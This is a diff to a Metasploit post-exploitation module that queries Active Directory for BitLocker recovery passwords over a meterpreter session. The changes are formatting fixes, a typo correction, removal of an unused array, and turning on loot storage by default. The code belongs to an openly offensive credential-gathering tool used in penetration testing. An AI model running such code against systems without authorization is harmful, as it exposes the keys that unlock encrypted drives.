@@ -14,23 +14,23 @@ class Metasploit3 < Msf::Post
 
   def initialize(info={})
     super( update_info( info,
-        'Name'	       => 'Windows Gather Active Directory Bitlocker Recovery',
-        'Description'  => %Q{
-            This module will enumerate bitlocker reocvery passwords in the default AD
-            directory. Requires Domain Admin or other delegated privileges.
-        },
-        'License'      => MSF_LICENSE,
-        'Author'       => [ 'Ben Campbell <ben.campbell[at]mwrinfosecurity.com>' ],
-        'Platform'     => [ 'win' ],
-        'SessionTypes' => [ 'meterpreter' ],
-        'References'   =>
+      'Name'         => 'Windows Gather Active Directory Bitlocker Recovery',
+      'Description'  => %Q{
+        This module will enumerate bitlocker recovery passwords in the default AD
+        directory. Requires Domain Admin or other delegated privileges.
+      },
+      'License'      => MSF_LICENSE,
+      'Author'       => [ 'Ben Campbell <ben.campbell[at]mwrinfosecurity.com>' ],
+      'Platform'     => [ 'win' ],
+      'SessionTypes' => [ 'meterpreter' ],
+      'References'   =>
         [
-          ['URL', 'tbc'],
+          ['URL', 'tbc']
         ]
-      ))
+    ))
 
     register_options([
-      OptBool.new('STORE_LOOT', [true, 'Store file in loot.', false]),
+      OptBool.new('STORE_LOOT', [true, 'Store file in loot.', true]),
       OptString.new('FIELDS', [true, 'FIELDS to retrieve.', 'distinguishedName,msFVE-RecoveryPassword']),
       OptString.new('FILTER', [true, 'Search filter.', '(objectClass=msFVE-RecoveryInformation)'])
     ], self.class)
@@ -54,12 +54,9 @@ class Metasploit3 < Msf::Post
         'Columns'    => fields
       )
 
-    # Reports are collections for easy database insertion
-    reports = []
     q[:results].each do |result|
       row = []
 
-      report = {}
       0.upto(fields.length-1) do |i|
         if result[i].nil?
           field = ""
@@ -70,7 +67,6 @@ class Metasploit3 < Msf::Post
         row << field
       end
 
-      reports << report
       results_table << row
     end
 
